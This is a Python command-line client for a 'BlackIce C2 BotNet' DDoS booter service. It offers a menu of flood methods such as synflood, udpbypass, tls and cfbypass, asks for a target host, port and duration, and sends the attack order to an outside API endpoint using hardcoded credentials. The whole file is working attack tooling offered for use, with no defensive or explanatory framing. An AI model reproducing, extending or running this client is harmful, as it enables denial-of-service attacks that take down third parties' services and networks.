import os
import time
import requests

# API credentials
USERNAME = "Iamgeo1"
PASSWORD = "5671"
API_ENDPOINT = "https://cypherservices.su/api/attack?username={USERNAME}&secret={PASSWORD}&host={HOST}&time={TIME}&port={PORT}&method={METHOD}"

# List of attack methods
ATTACK_METHODS = [
    "homehold", "synflood", "discord", "telegram", "openvpn", "tcpkill", "tcpmix", "udpgostorm", "ovh",
    "ssh", "tcpboom", "udpbypass", "stun", "mixamp", "homekill", "dns", "game", "fivem", "tls", "http",
    "httpsbypass", "browser", "cfbypass"
]

# Clear screen function
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Display menu
def display_menu():
    clear_screen()

    # Title
    print("BLACKICE C2 BotNet\n")
    
    # Welcome box
    print("+------------------------------------------+")
    print("| Welcome to the BlackIce C2 BotNet       |")
    print("| Powered by BlackIce API                 |")
    print("+------------------------------------------+")
    print("\nJoin the community: https://t.me/BlackIceC2")
    print("Copyright © 2025 BlackIce - All Rights Reserved")
    print("Created by iamgeo1 & mzz")
    print("=" * 50)

# Show help and display attack methods
def show_help():
    print("\n+------------------------ COMMANDS ------------------------+")
    print("[help]   - Show this help message")
    print("[clear]  - Clear the terminal screen")
    print("[exit]   - Exit the program")
    print("+---------------------------------------------------------+")

    print("\nAvailable Attack Methods:")
    columns = 3
    for i in range(0, len(ATTACK_METHODS), columns):
        row = []
        for j in range(columns):
            if i + j < len(ATTACK_METHODS):
                method = ATTACK_METHODS[i + j]
                row.append(f"[{i + j + 1}] {method}")
        print("   ".join(row))

# Get user input
def get_input():
    try:
        command = input("[root@BlackIce] ~ ").strip().lower()
        if command == 'help':
            show_help()
        elif command == 'clear':
            clear_screen()
            display_menu()
        elif command == 'exit':
            print("\n[!] Shutting down BlackIce...")
            exit()
        else:
            try:
                choice = int(command)
                if 1 <= choice <= len(ATTACK_METHODS):
                    method = ATTACK_METHODS[choice - 1]
                    host = input("\nTarget (IP/Host): ")
                    port = input("Port: ")
                    duration = input("Duration (seconds): ")

                    print("\nLaunching attack...")
                    send_attack(method, host, port, duration)
                else:
                    print("\nInvalid selection.")
            except ValueError:
                print("\nInvalid input.")
    except Exception as e:
        print("\nError: {e}")

# Send attack request
def send_attack(method, host, port, duration):
    url = API_ENDPOINT.format(
        USERNAME=USERNAME,
        PASSWORD=PASSWORD,
        HOST=host,
        PORT=port,
        TIME=duration,
        METHOD=method
    )
    response = requests.get(url)

    if response.status_code == 200:
        print(f"\nBooted By BlackIce.... {host}:{port} using {method} for {duration} seconds!")
    else:
        print(f"\nError: {response.text}")

    time.sleep(3)
    main()

# Main function
def main():
    display_menu()
    while True:
        get_input()

if __name__ == "__main__":
    main()
